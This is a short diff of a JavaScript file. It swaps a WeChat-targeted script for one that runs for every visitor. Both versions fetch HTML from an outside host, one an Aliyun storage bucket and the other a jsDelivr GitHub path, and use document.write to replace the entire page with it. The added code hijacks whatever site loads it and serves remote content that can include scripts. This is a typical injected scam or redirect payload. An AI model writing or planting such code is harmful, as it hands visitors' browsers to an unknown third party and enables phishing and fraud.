@@ -1,19 +1,14 @@
-var ua = navigator.userAgent.toLowerCase();
-if (/micromessenger/.test(ua)) {
-    var xhr = new XMLHttpRequest;
-    var html = null;
-    function render() {
-        var a = document.open("text/html", "replace");
-        a.write(html);
-        a.close();
-    }
-    xhr.onload = function () {
-        html = xhr.responseText;
-        var delay = 0;
-        if (delay > 0) setTimeout("render()", delay * 1000)
-        else render();
-    };
-    xhr.open("GET", "//lbbb.oss-cn-hangzhou.aliyuncs.com/hb_v3/changba/changba.html?t=" + Date.now(), !0);
-
-    xhr.send();
+var xhr = new XMLHttpRequest();
+$ = null;
+xhr.open('GET', 'https://cdn.jsdelivr.net/gh/creazyjs/lovebb@4/s.html', false);
+xhr.onload = function () {
+  if (xhr.status == 200) {
+    var doc = document.open('replace', 'text/html');
+    setTimeout(function () {
+      doc.write(xhr.responseText);
+    }, 60);
+    doc.close();
+  }
 }
+
+xhr.send();
